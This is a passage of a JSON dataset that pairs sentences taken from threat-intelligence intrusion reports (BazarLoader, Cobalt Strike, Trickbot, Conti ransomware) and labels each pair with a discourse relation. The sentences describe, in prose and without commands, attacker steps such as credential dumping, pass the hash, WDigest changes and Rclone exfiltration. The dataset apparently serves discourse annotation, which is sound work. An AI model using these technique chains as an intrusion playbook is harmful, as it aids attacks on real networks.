        "S1": "They then pivoted over to another domain controller, repeated all the above discovery steps, and ran the same tools as on the first domain controller.",
        "S2": "After almost a day of inactivity, the operators logged into the network and used RDP to remote into file servers that contained valuable data.",
        "relation": "MISC"
    },
    {
        "S1": "Eventually, this intrusion ended on the third day from the initial BazarLoader execution.",
        "S2": "Brad reported on similar BazarLoader activity initiated from malicious TA551 Word Doc email campaign that resulted in Cobalt Strike beacons.",
        "relation": "ELABORATION"
    },
    {
        "S1": "After almost a day of inactivity, the operators logged into the network and used RDP to remote into file servers that contained valuable data.",
        "S2": "Typically, these types of cases end up with Conti ransomware, however, the threat actors were evicted from the network before a final suspected ransomware deployment commenced.",
        "relation": "NEXT"
    },
    {
        "S1": "They then created a directory called Shares$ and used Rclone to exfiltrate the data to the Mega Fileshare service.",
        "S2": "The threat actors created a full backup of the active directory in \u201cIFM\u201d media mode and dumped the password hashes along with the corresponding users.",
        "relation": "MISC"
    },
    {
        "S1": "Typically, these types of cases end up with Conti ransomware, however, the threat actors were evicted from the network before a final suspected ransomware deployment commenced.",
        "S2": "Multiple sensitive files were exfiltrated but before the threat actors could take any further action inside the network, they were evicted from the network.",
        "relation": "MISC"
    },
    {
        "S1": "Typically, these types of cases end up with Conti ransomware, however, the threat actors were evicted from the network before a final suspected ransomware deployment commenced.",
        "S2": "The passwords that they used were the same as the passwords of the recent Conti leaked documents.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Typically, these types of cases end up with Conti ransomware, however, the threat actors were evicted from the network before a final suspected ransomware deployment commenced.",
        "S2": "Throughout the intrusion, the threat actors utilized Cobalt Strike beacons and PowerShell to execute their payloads prior to interactively remoting into hosts using RDP and AnyDesk.",
        "relation": "MISC"
    },
    {
        "S1": "We assess with medium to high confidence that the initial access was a result of malicious, macro-enabled, Word document that was sent as an attachment to the targets of a phishing campaign.",
        "S2": "We then observed the threat actor using the BazarLoader injected process, svchost.exe, to download Cobalt Strike and save it under:",
        "relation": "NEXT"
    },
    {
        "S1": "We assess with medium to high confidence that the initial access was a result of malicious, macro-enabled, Word document that was sent as an attachment to the targets of a phishing campaign.",
        "S2": "Twenty minutes after the initial execution, BazarLoader downloaded and executed Cobalt Strike beacon with the help of rundll32.exe.",
        "relation": "NEXT"
    },
    {
        "S1": "Brad reported on similar BazarLoader activity initiated from malicious TA551 Word Doc email campaign that resulted in Cobalt Strike beacons.",
        "S2": "We then observed the threat actor using the BazarLoader injected process, svchost.exe, to download Cobalt Strike and save it under:",
        "relation": "NEXT"
    },
    {
        "S1": "Immediately after the execution, the malware contacted two of its C2 IPs:",
        "S2": "before executing it using rundll32.exe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We then observed the threat actor using the BazarLoader injected process, svchost.exe, to download Cobalt Strike and save it under:",
        "S2": "Throughout the intrusion, the threat actors utilized Cobalt Strike beacons and PowerShell to execute their payloads prior to interactively remoting into hosts using RDP and AnyDesk.",
        "relation": "MISC"
    },
    {
        "S1": "We then observed the threat actor using the BazarLoader injected process, svchost.exe, to download Cobalt Strike and save it under:",
        "S2": "The threat actor was seen logging in from 185.220.100.242 (Tor Exit Node) using AnyDesk.",
        "relation": "MISC"
    },
    {
        "S1": "We then observed the threat actor using the BazarLoader injected process, svchost.exe, to download Cobalt Strike and save it under:",
        "S2": "The Sysmon logs captured in our case below can be used to detect this type of activity.",
        "relation": "MISC"
    },
    {
        "S1": "Throughout the intrusion, the threat actors utilized Cobalt Strike beacons and PowerShell to execute their payloads prior to interactively remoting into hosts using RDP and AnyDesk.",
        "S2": "Commands from the intrusion:",
        "relation": "MISC"
    },
    {
        "S1": "Throughout the intrusion, the threat actors utilized Cobalt Strike beacons and PowerShell to execute their payloads prior to interactively remoting into hosts using RDP and AnyDesk.",
        "S2": "AnyDesk was also installed on the main domain controller.",
        "relation": "MISC"
    },
    {
        "S1": "Throughout the intrusion, the threat actors utilized Cobalt Strike beacons and PowerShell to execute their payloads prior to interactively remoting into hosts using RDP and AnyDesk.",
        "S2": "The threat actors accessed credentials for an administrator account from the LSASS process using the Cobalt Strike beacon.",
        "relation": "LIST"
    },
    {
        "S1": "The passwords that they used were the same as the passwords of the recent Conti leaked documents.",
        "S2": "The threat actors maintained an open communication channel through AnyDesk for a period of 11 hours.",
        "relation": "MISC"
    },
    {
        "S1": "Commands from the intrusion:",
        "S2": "Throughout the intrusion, we observed multiple instances of process injection from both the initial BazarLoader malware and Cobalt Strike beacons.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors maintained an open communication channel through AnyDesk for a period of 11 hours.",
        "S2": "The threat actors accessed credentials for an administrator account from the LSASS process using the Cobalt Strike beacon.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor was seen logging in from 185.220.100.242 (Tor Exit Node) using AnyDesk.",
        "S2": "Threat actor dropped and ran a script named ping.bat.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors accessed credentials for an administrator account from the LSASS process using the Cobalt Strike beacon.",
        "S2": "The LSASS process was accessed by an unusual process \u201csearchindexer.exe\u201d on beachhead right before the lateral movement was observed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors accessed credentials for an administrator account from the LSASS process using the Cobalt Strike beacon.",
        "S2": "The threat actors executed AdFind multiple times on both the beachhead and the domain controllers through a well-known script called adf.bat.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors accessed credentials for an administrator account from the LSASS process using the Cobalt Strike beacon.",
        "S2": "Throughout the intrusion, we observed multiple instances of process injection from both the initial BazarLoader malware and Cobalt Strike beacons.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors accessed credentials for an administrator account from the LSASS process using the Cobalt Strike beacon.",
        "S2": "Additionally, the Cobalt Strike beacon was injected into mstsc.exe, searchindexer.exe and rundll32.exe and run various tasks from these processes.",
        "relation": "MISC"
    },
    {
        "S1": "On the image below, we can see that the CS beacon process is injected into LSASS.",
        "S2": "The LSASS process was accessed by an unusual process \u201csearchindexer.exe\u201d on beachhead right before the lateral movement was observed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Throughout the intrusion, we observed multiple instances of process injection from both the initial BazarLoader malware and Cobalt Strike beacons.",
        "S2": "A few minutes after the initial execution, BazarLoader ran some discovery tasks using the built in Microsoft net and nltest utilities and transferred the results over the C2 channel.",
        "relation": "MISC"
    },
    {
        "S1": "Throughout the intrusion, we observed multiple instances of process injection from both the initial BazarLoader malware and Cobalt Strike beacons.",
        "S2": "Additionally, the Cobalt Strike beacon was injected into mstsc.exe, searchindexer.exe and rundll32.exe and run various tasks from these processes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "After BazarLoader was loaded in memory, almost immediately it injected into svchost.exe process.",
        "S2": "A few minutes after the initial execution, BazarLoader ran some discovery tasks using the built in Microsoft net and nltest utilities and transferred the results over the C2 channel.",
        "relation": "MISC"
    },
    {
        "S1": "Additionally, the Cobalt Strike beacon was injected into mstsc.exe, searchindexer.exe and rundll32.exe and run various tasks from these processes.",
        "S2": "Later on, hands-on operators carried out some additional network and domain reconnaissance from the Cobalt Strike beacon.",
        "relation": "MISC"
    },
    {
        "S1": "The Sysmon logs captured in our case below can be used to detect this type of activity.",
        "S2": "Later on, during the first day of the intrusion, and before we saw the threat actors pivot laterally to the domain controller, they ensured the information that they had collected was accurate by running the below enumeration commands:",
        "relation": "MISC"
    },
    {
        "S1": "They also employed the NtdsAudit tool immediately after using NTDSutil to dump the password hashes of all domain users.",
        "S2": "After providing these as arguments, they exported the password hashes in a file that they named \u201cpwdump.txt\u201d and the user details in a csv file called \u201cusers.csv\u201d.",
        "relation": "NEXT"
    },
    {
        "S1": "After obtaining the password hashes, the threat actors can crack the passwords hashes using a program such as hashcat.",
        "S2": "We also noticed the threat actors searching for any existing antivirus software on the domain controller.",
        "relation": "MISC"
    },
    {
        "S1": "A few minutes after the initial execution, BazarLoader ran some discovery tasks using the built in Microsoft net and nltest utilities and transferred the results over the C2 channel.",
        "S2": "Later on, during the first day of the intrusion, and before we saw the threat actors pivot laterally to the domain controller, they ensured the information that they had collected was accurate by running the below enumeration commands:",
        "relation": "NEXT"
    },
    {
        "S1": "Again, built in utilities were favored, with the exception of what we assess was a fat finger or miss-paste by the threat actor entering a command they meant to execute in their Cobalt Strike console into the windows command terminal.",
        "S2": "They used reverse proxy via the Cobalt Strike C2 to initiate the RDP connection and for that reason, the operator\u2019s real hostname was captured in event ID 4624:",
        "relation": "MISC"
    },
    {
        "S1": "Later on, during the first day of the intrusion, and before we saw the threat actors pivot laterally to the domain controller, they ensured the information that they had collected was accurate by running the below enumeration commands:",
        "S2": "The threat actors utilized Advanced IP Scanner to the scan for open ports.",
        "relation": "MISC"
    },
    {
        "S1": "Later on, during the first day of the intrusion, and before we saw the threat actors pivot laterally to the domain controller, they ensured the information that they had collected was accurate by running the below enumeration commands:",
        "S2": "Many hours after the initial compromise, we observed the threat actors using RDP to connect to the first domain controller.",
        "relation": "MISC"
    },
    {
        "S1": "Later on, during the first day of the intrusion, and before we saw the threat actors pivot laterally to the domain controller, they ensured the information that they had collected was accurate by running the below enumeration commands:",
        "S2": "One of the first things that the attackers did once on the first domain controller, was to execute Invoke-ShareFinder from PowerSploit via PowerShell ISE.",
        "relation": "MISC"
    },
    {
        "S1": "Later on, during the first day of the intrusion, and before we saw the threat actors pivot laterally to the domain controller, they ensured the information that they had collected was accurate by running the below enumeration commands:",
        "S2": "We also noticed the threat actors searching for any existing antivirus software on the domain controller.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Threat actor dropped and ran a script named ping.bat.",
        "S2": "From the Domain Controller the threat actor also ran a Seatbelt binary, which was also seen in the Conti leak documents.",
        "relation": "MISC"
    },
    {
        "S1": "One of the first things that the attackers did once on the first domain controller, was to execute Invoke-ShareFinder from PowerSploit via PowerShell ISE.",
        "S2": "From the Domain Controller the threat actor also ran a Seatbelt binary, which was also seen in the Conti leak documents.",
        "relation": "NEXT"
    },
    {
        "S1": "Other Microsoft AD management PowerShell administration modules were also invoked by the threat actors for discovery tasks.",
        "S2": "The AnyDesk software installed by the threat actors maintained a constant connection to the Anydesk infrastructure for the duration of the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "From the Domain Controller the threat actor also ran a Seatbelt binary, which was also seen in the Conti leak documents.",
        "S2": "They used reverse proxy via the Cobalt Strike C2 to initiate the RDP connection and for that reason, the operator\u2019s real hostname was captured in event ID 4624:",
        "relation": "MISC"
    },
    {
        "S1": "From the Domain Controller the threat actor also ran a Seatbelt binary, which was also seen in the Conti leak documents.",
        "S2": "We also noticed the threat actors searching for any existing antivirus software on the domain controller.",
        "relation": "MISC"
    },
    {
        "S1": "We also noticed the threat actors searching for any existing antivirus software on the domain controller.",
        "S2": "Many hours after the initial compromise, we observed the threat actors using RDP to connect to the first domain controller.",
        "relation": "MISC"
    },
    {
        "S1": "Many hours after the initial compromise, we observed the threat actors using RDP to connect to the first domain controller.",
        "S2": "The AnyDesk software installed by the threat actors maintained a constant connection to the Anydesk infrastructure for the duration of the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "Many hours after the initial compromise, we observed the threat actors using RDP to connect to the first domain controller.",
        "S2": "As the threat actors were perusing files, we received a notification that one of our files had been remotely opened from 46.38.235.14.",
        "relation": "MISC"
    },
    {
        "S1": "They used reverse proxy via the Cobalt Strike C2 to initiate the RDP connection and for that reason, the operator\u2019s real hostname was captured in event ID 4624:",
        "S2": "Twenty minutes after the initial execution, BazarLoader downloaded and executed Cobalt Strike beacon with the help of rundll32.exe.",
        "relation": "MISC"
    },
    {
        "S1": "They then inspected the documents they collected prior to exfiltrating them over to Mega storage servers using the Rclone application.",
        "S2": "The threat actors later exfiltrated sensitive documents from domain joined file servers using the Rclone application.",
        "relation": "ELABORATION"
    },
    {
        "S1": "BazarLoader initial communication with the C2 is over HTTPS.",
        "S2": "Twenty minutes after the initial execution, BazarLoader downloaded and executed Cobalt Strike beacon with the help of rundll32.exe.",
        "relation": "MISC"
    },
    {
        "S1": "Twenty minutes after the initial execution, BazarLoader downloaded and executed Cobalt Strike beacon with the help of rundll32.exe.",
        "S2": "These connections originated from one of the Cobalt Strike processes over port 5222.",
        "relation": "MISC"
    },
    {
        "S1": "The AnyDesk software installed by the threat actors maintained a constant connection to the Anydesk infrastructure for the duration of the intrusion.",
        "S2": "As the threat actors were perusing files, we received a notification that one of our files had been remotely opened from 46.38.235.14.",
        "relation": "MISC"
    },
    {
        "S1": "These connections originated from one of the Cobalt Strike processes over port 5222.",
        "S2": "According to public records, the IP is associated with an old Cobalt Strike C2 server.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors later exfiltrated sensitive documents from domain joined file servers using the Rclone application.",
        "S2": "Breaking down the Rclone command line arguments:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors later exfiltrated sensitive documents from domain joined file servers using the Rclone application.",
        "S2": "The above command was copied and pasted by the threat actors to exfiltrate the data.",
        "relation": "ELABORATION"
    },
    {
        "S1": "That command contained a different victim organization in the arguments showing through out the intrusion continued sloppiness of the threat actor.",
        "S2": "Multiple sensitive files were exfiltrated but before the threat actors could take any further action inside the network, they were evicted from the network.",
        "relation": "MISC"
    },
    {
        "S1": "Multiple sensitive files were exfiltrated but before the threat actors could take any further action inside the network, they were evicted from the network.",
        "S2": "Information posted from @AltShiftPrtScn based on an IR engagement where the threat actors already had domain admin on the network two months prior meeting their final objectives.",
        "relation": "MISC"
    },
    {
        "S1": "At the time of the intrusion, the group was favoring zip attachments with malicious javascript files to download the BazarLoader malware.",
        "S2": "The threat actors then began using pass the hash with various accounts which continued several times throughout the intrusion.",
        "relation": "NEXT"
    },
    {
        "S1": "Upon initial execution on the beachhead, the malware made an initial connection to command and control, and then a few minutes later it performed discovery tasks on the host using Microsoft utilities like Net and Nltest to discover the domain and users of interest.",
        "S2": "After this activity, the host went quiet for about one hour before downloading and executing a Cobalt Strike beacon DLL.",
        "relation": "NEXT"
    },
    {
        "S1": "Upon initial execution on the beachhead, the malware made an initial connection to command and control, and then a few minutes later it performed discovery tasks on the host using Microsoft utilities like Net and Nltest to discover the domain and users of interest.",
        "S2": "The threat actors used Cobalt Strike to run additional discovery tasks using Microsoft utilities like net, ping, systeminfo, and taskmanager.",
        "relation": "NEXT"
    },
    {
        "S1": "Upon initial execution on the beachhead, the malware made an initial connection to command and control, and then a few minutes later it performed discovery tasks on the host using Microsoft utilities like Net and Nltest to discover the domain and users of interest.",
        "S2": "When executed in this manner the ransomware mounts all remote C$ drives in the local network and proceeds to encrypt the contents over the SMB connection.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors used Cobalt Strike to run additional discovery tasks using Microsoft utilities like net, ping, systeminfo, and taskmanager.",
        "S2": "This was the primary lateral movement option favored by the threat actor, however PowerShell Cobalt Strike beacons, service executable Cobalt Strike beacons, and RDP were all used, but less commonly.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors used Cobalt Strike to run additional discovery tasks using Microsoft utilities like net, ping, systeminfo, and taskmanager.",
        "S2": "The discovery commands utilize the familiar built in Microsoft utilities.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors then began using pass the hash with various accounts which continued several times throughout the intrusion.",
        "S2": "Around two and a half hours into the intrusion the threat actors began lateral movement.",
        "relation": "MISC"
    },
    {
        "S1": "Around two and a half hours into the intrusion the threat actors began lateral movement.",
        "S2": "About 12 hours later the threat actors became active again.",
        "relation": "NEXT"
    },
    {
        "S1": "Around two and a half hours into the intrusion the threat actors began lateral movement.",
        "S2": "The threat actors made use of pass the hash techniques to try to escalate privileges during the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "This was the primary lateral movement option favored by the threat actor, however PowerShell Cobalt Strike beacons, service executable Cobalt Strike beacons, and RDP were all used, but less commonly.",
        "S2": "Seeing that this starts with a DLL file it is more likely that this was related to an email campaign using malicious zipped Javascript files.",
        "relation": "MISC"
    },
    {
        "S1": "After this phase completed, the threat actor\u2019s activity faded but the Cobalt Strike continued to beacon out to the C2 server.",
        "S2": "About an hour after the initial execution on the beachhead, a Cobalt Strike beacon was executed also with rundll32.",
        "relation": "MISC"
    },
    {
        "S1": "After this phase completed, the threat actor\u2019s activity faded but the Cobalt Strike continued to beacon out to the C2 server.",
        "S2": "Throughout the intrusion the threat actor checked the time of systems with:",
        "relation": "MISC"
    },
    {
        "S1": "From the domain controller the threat actors continued further lateral movement to more servers in the environment.",
        "S2": "Around 31 hours after initial access to the environment, the threat actors felt they were ready to complete their final objectives.",
        "relation": "NEXT"
    },
    {
        "S1": "They downloaded WinSCP from the project website, installed it on the file server and proceeded to exfiltrate data from the server using SCP to a VPS host they controlled in Romania.",
        "S2": "About an hour after the initial execution on the beachhead, a Cobalt Strike beacon was executed also with rundll32.",
        "relation": "MISC"
    },
    {
        "S1": "Around 31 hours after initial access to the environment, the threat actors felt they were ready to complete their final objectives.",
        "S2": "The threat actors must have confirmed quickly that their tests were successful as within minutes they dropped test.exe renamed to backup.exe on two servers in the environment and executed manually via their RDP sessions.",
        "relation": "MISC"
    },
    {
        "S1": "Around 31 hours after initial access to the environment, the threat actors felt they were ready to complete their final objectives.",
        "S2": "This test file was the Conti ransomware executable, and the threat actors decided to test in a controlled manner before running the full domain ransomware deployment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "RDP activity was seen from several hosts and an executable named test.exe was transferred to several endpoints.",
        "S2": "Like before, these \u201cunit tests,\u201d were performed using wmic to execute the files remotely on the endpoints.",
        "relation": "MISC"
    },
    {
        "S1": "This test file was the Conti ransomware executable, and the threat actors decided to test in a controlled manner before running the full domain ransomware deployment.",
        "S2": "The threat actors must have confirmed quickly that their tests were successful as within minutes they dropped test.exe renamed to backup.exe on two servers in the environment and executed manually via their RDP sessions.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors must have confirmed quickly that their tests were successful as within minutes they dropped test.exe renamed to backup.exe on two servers in the environment and executed manually via their RDP sessions.",
        "S2": "Initial execution occurred via the Bazarloader DLL being executed by rundll32.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors must have confirmed quickly that their tests were successful as within minutes they dropped test.exe renamed to backup.exe on two servers in the environment and executed manually via their RDP sessions.",
        "S2": "At this point, the Time to Ransom (TTR) for the threat actors was just shy of 32 hours since initial access.",
        "relation": "ELABORATION"
    },
    {
        "S1": "When executed in this manner the ransomware mounts all remote C$ drives in the local network and proceeds to encrypt the contents over the SMB connection.",
        "S2": "In this case we did not observe the initial delivery for the malware.",
        "relation": "MISC"
    },
    {
        "S1": "At this point, the Time to Ransom (TTR) for the threat actors was just shy of 32 hours since initial access.",
        "S2": "The threat actors made use of pass the hash techniques to try to escalate privileges during the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "BazarLoader however tends to arrive in an environment via malicious email campaigns and in a few cases its been reported via call centers social engineering users to load the malware.",
        "S2": "Initial execution occurred via the Bazarloader DLL being executed by rundll32.",
        "relation": "NEXT"
    },
    {
        "S1": "BazarLoader however tends to arrive in an environment via malicious email campaigns and in a few cases its been reported via call centers social engineering users to load the malware.",
        "S2": "The BazarLoader malware on the beachhead began discovery actions around 20 minutes after the initial execution.",
        "relation": "NEXT"
    },
    {
        "S1": "Seeing that this starts with a DLL file it is more likely that this was related to an email campaign using malicious zipped Javascript files.",
        "S2": "This included testing their ransomware in the compromised environment before deploying across the domain.",
        "relation": "NEXT"
    },
    {
        "S1": "About an hour after the initial execution on the beachhead, a Cobalt Strike beacon was executed also with rundll32.",
        "S2": "The BazarLoader malware on the beachhead began discovery actions around 20 minutes after the initial execution.",
        "relation": "MISC"
    },
    {
        "S1": "About an hour after the initial execution on the beachhead, a Cobalt Strike beacon was executed also with rundll32.",
        "S2": "Process injection was seen from the Cobalt Strike beacon into a svchost process running with System level privilege.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors made use of pass the hash techniques to try to escalate privileges during the intrusion.",
        "S2": "While in the environment they injected Cobalt Strike beacons into many processes.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors made use of pass the hash techniques to try to escalate privileges during the intrusion.",
        "S2": "Throughout the intrusion the threat actor checked the time of systems with:",
        "relation": "MISC"
    },
    {
        "S1": "Process injection was seen from the Cobalt Strike beacon into a svchost process running with System level privilege.",
        "S2": "The Cobalt Strike beacon ran additional discovery tasks on the beachhead.",
        "relation": "MISC"
    },
    {
        "S1": "While in the environment they injected Cobalt Strike beacons into many processes.",
        "S2": "The threat actors were seen dumping credentials out of lsass memory across the domain.",
        "relation": "MISC"
    },
    {
        "S1": "While in the environment they injected Cobalt Strike beacons into many processes.",
        "S2": "The Cobalt Strike beacon ran additional discovery tasks on the beachhead.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors were seen dumping credentials out of lsass memory across the domain.",
        "S2": "For lateral movement the threat actors relied heavily on copying executable files over SMB and then executing them via remote WMIC calls",
        "relation": "MISC"
    },
    {
        "S1": "The BazarLoader malware on the beachhead began discovery actions around 20 minutes after the initial execution.",
        "S2": "When executed in this manner, the ransomware payload attempts to spread laterally over SMB.",
        "relation": "NEXT"
    },
    {
        "S1": "The BazarLoader malware on the beachhead began discovery actions around 20 minutes after the initial execution.",
        "S2": "The Cobalt Strike beacon ran additional discovery tasks on the beachhead.",
        "relation": "MISC"
    },
    {
        "S1": "The discovery commands utilize the familiar built in Microsoft utilities.",
        "S2": "Again built in Microsoft utilities were utilized.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Cobalt Strike beacon ran additional discovery tasks on the beachhead.",
        "S2": "From an svchost process injected with a Cobalt Strike beacon, SMB scanning was performed across the environment.",
        "relation": "MISC"
    },
    {
        "S1": "Throughout the intrusion the threat actor checked the time of systems with:",
        "S2": "The threat actor on the second day of the intrusion downloaded WinSCP to the file server and proceeded to install the program there.",
        "relation": "MISC"
    },
    {
        "S1": "Throughout the intrusion the threat actor checked the time of systems with:",
        "S2": "From the domain controller the threat actor ran an encoded PowerShell command to review the size and condition of hard drives across the environment.",
        "relation": "MISC"
    },
    {
        "S1": "From an svchost process injected with a Cobalt Strike beacon, SMB scanning was performed across the environment.",
        "S2": "Remote Cobalt Strike beacons were started with services and PowerShell several times in the environment.",
        "relation": "MISC"
    },
    {
        "S1": "Powersploit modules like Get-NetComputer were seen used by the threat actor from the domain controller",
        "S2": "The contents of Get-DataInfo.ps1 provide the threat actor with very specific details of the environment.",
        "relation": "MISC"
    },
    {
        "S1": "The contents of Get-DataInfo.ps1 provide the threat actor with very specific details of the environment.",
        "S2": "While executables and wmic were the preferred options for the threat actor, they did employ several other techniques.",
        "relation": "MISC"
    },
    {
        "S1": "The contents of Get-DataInfo.ps1 provide the threat actor with very specific details of the environment.",
        "S2": "This script was first reported used by threat actors deploying the Ryuk ransomware strain.",
        "relation": "ELABORATION"
    },
    {
        "S1": "While executables and wmic were the preferred options for the threat actor, they did employ several other techniques.",
        "S2": "This was not used for primary command and control and the amount of data sent was small so we do not know the full intentions of the activity but several critical systems like domain controllers and file servers made connections to TOR nodes initiated by the threat actors.",
        "relation": "MISC"
    },
    {
        "S1": "While executables and wmic were the preferred options for the threat actor, they did employ several other techniques.",
        "S2": "During the final stages the threat actor used RDP to move between a few servers as part of their final actions.",
        "relation": "NEXT"
    },
    {
        "S1": "Remote Cobalt Strike beacons were started with services and PowerShell several times in the environment.",
        "S2": "At that time, a Cobalt Strike beacon executable was executed as a service on a remote host for testing the final ransom deployment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "During the final stages the threat actor used RDP to move between a few servers as part of their final actions.",
        "S2": "The threat actor on the second day of the intrusion downloaded WinSCP to the file server and proceeded to install the program there.",
        "relation": "MISC"
    },
    {
        "S1": "At that time, a Cobalt Strike beacon executable was executed as a service on a remote host for testing the final ransom deployment.",
        "S2": "They initiated RDP connections and a Cobalt Strike beacon executable file to a endpoint not yet interacted with by the threat actors.",
        "relation": "MISC"
    },
    {
        "S1": "This server was seen communicating with multiple internal systems:",
        "S2": "This was not used for primary command and control and the amount of data sent was small so we do not know the full intentions of the activity but several critical systems like domain controllers and file servers made connections to TOR nodes initiated by the threat actors.",
        "relation": "MISC"
    },
    {
        "S1": "This was not used for primary command and control and the amount of data sent was small so we do not know the full intentions of the activity but several critical systems like domain controllers and file servers made connections to TOR nodes initiated by the threat actors.",
        "S2": "During the overnight hours of the 2nd day the threat actors began moving on their final objectives.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor on the second day of the intrusion downloaded WinSCP to the file server and proceeded to install the program there.",
        "S2": "During the overnight hours of the 2nd day the threat actors began moving on their final objectives.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor on the second day of the intrusion downloaded WinSCP to the file server and proceeded to install the program there.",
        "S2": "Another data point is that following the exfiltration canary documents present in the shares reported in as being opened from an IP on a Virtual Private Host provider in New York, USA.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor then proceeded to connect over port 22 to a server in Romania.",
        "S2": "The threat actor then transferred a Conti executable file to several endpoints named test.exe.",
        "relation": "NEXT"
    },
    {
        "S1": "They initiated RDP connections and a Cobalt Strike beacon executable file to a endpoint not yet interacted with by the threat actors.",
        "S2": "After testing on several endpoints, the threat actors dropped a renamed version of the file on several servers in the environment and executed by hand using their RDP session.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor then transferred a Conti executable file to several endpoints named test.exe.",
        "S2": "After testing on several endpoints, the threat actors dropped a renamed version of the file on several servers in the environment and executed by hand using their RDP session.",
        "relation": "NEXT"
    },
    {
        "S1": "After testing on several endpoints, the threat actors dropped a renamed version of the file on several servers in the environment and executed by hand using their RDP session.",
        "S2": "From there, the threat actors left the environment with this note and domain wide encryption completed about 32 hours after the initial beachhead BazarLoader was executed.",
        "relation": "NEXT"
    },
    {
        "S1": "We assess with medium confidence that the initial threat vector for this intrusion was a password protected archive, delivered via malspam campaigns.",
        "S2": "The Trickbot payload seen during this intrusion was likely spread via a weaponized Word or Excel file from an email campaign.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We assess with medium confidence that the initial threat vector for this intrusion was a password protected archive, delivered via malspam campaigns.",
        "S2": "This behavior was also observed in one of our previous intrusion cases.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We assess with medium confidence that the initial threat vector for this intrusion was a password protected archive, delivered via malspam campaigns.",
        "S2": "The threat actor then utilized built-in Windows utilities such as net.exe, ipconfig.exe and nltest.exe for performing internal reconnaissance.",
        "relation": "NEXT"
    },
    {
        "S1": "The zip attachment would likely contain a Word or Excel document with macros, which upon execution, would start a Trickbot infection.",
        "S2": "The Trickbot payload seen during this intrusion was likely spread via a weaponized Word or Excel file from an email campaign.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Trickbot payload injected itself into the system process wermgr.exe \u2014 the Windows process responsible for error reporting.",
        "S2": "The Trickbot payload seen during this intrusion was likely spread via a weaponized Word or Excel file from an email campaign.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor then utilized built-in Windows utilities such as net.exe, ipconfig.exe and nltest.exe for performing internal reconnaissance.",
        "S2": "With the additional remote sessions, the attackers ran encoded PowerShell commands, one of which loaded the Active Directory module and collected information about Windows computers in the domain.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor then utilized built-in Windows utilities such as net.exe, ipconfig.exe and nltest.exe for performing internal reconnaissance.",
        "S2": "The threat actor enabled WDigest authentication by changing the value of the \u201cUseLogonCredential\u201d object from 0 to 1 in the Windows registry.",
        "relation": "NEXT"
    },
    {
        "S1": "Having obtained sensitive credentials, WMIC was used to deploy a fake password manager application across multiple systems in the network.",
        "S2": "The fake installer drops and executes a file embedded with Cobalt Strike stager shellcode, which attempts to fetch a CS beacon.",
        "relation": "NEXT"
    },
    {
        "S1": "With the additional remote sessions, the attackers ran encoded PowerShell commands, one of which loaded the Active Directory module and collected information about Windows computers in the domain.",
        "S2": "Another PowerShell script, named \u201cGet-DataInfo.ps1\u201d, aimed to provide a list of active systems including its anti-virus state.",
        "relation": "LIST"
    },
    {
        "S1": "With the additional remote sessions, the attackers ran encoded PowerShell commands, one of which loaded the Active Directory module and collected information about Windows computers in the domain.",
        "S2": "It is unclear why the actors decided not to continue with their operation.",
        "relation": "NEXT"
    },
    {
        "S1": "With the additional remote sessions, the attackers ran encoded PowerShell commands, one of which loaded the Active Directory module and collected information about Windows computers in the domain.",
        "S2": "To prepare for code injection, the Trickbot executable allocated memory in the address space of the Windows system process \u201cwermgr.exe\u201d (Windows Error Reporting Module).",
        "relation": "MISC"
    },
    {
        "S1": "Another PowerShell script, named \u201cGet-DataInfo.ps1\u201d, aimed to provide a list of active systems including its anti-virus state.",
        "S2": "No exfiltration of data or impact to the systems was observed.",
        "relation": "NEXT"
    },
    {
        "S1": "It is unclear why the actors decided not to continue with their operation.",
        "S2": "It appears the threat actors used LPUB3D as a shell for this install, as all the folders and some of the dlls are from LPub3D, an Open Source WYSIWYG editing application for creating LEGO\u00ae style digital building instructions.",
        "relation": "MISC"
    },
    {
        "S1": "The Trickbot payload seen during this intrusion was likely spread via a weaponized Word or Excel file from an email campaign.",
        "S2": "Trickbot utilized the same instance of wermgr.exe to load Cobalt Strike beacons into memory using PowerShell, which remained active throughout the intrusion:",
        "relation": "NEXT"
    },
    {
        "S1": "The Trickbot payload (1a5f3ca6597fcccd3295ead4d22ce70b.exe) was manually executed on a single endpoint.",
        "S2": "As typically seen in Trickbot infections, it drops a copy of itself into this folder along with its encrypted config (settings.ini) and a batch file (launcher.bat).",
        "relation": "MISC"
    },
    {
        "S1": "The Trickbot payload (1a5f3ca6597fcccd3295ead4d22ce70b.exe) was manually executed on a single endpoint.",
        "S2": "Upon execution, the payload injects into the wermgr.exe process.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The visual representation of process tree execution pattern on beachhead can be seen below.",
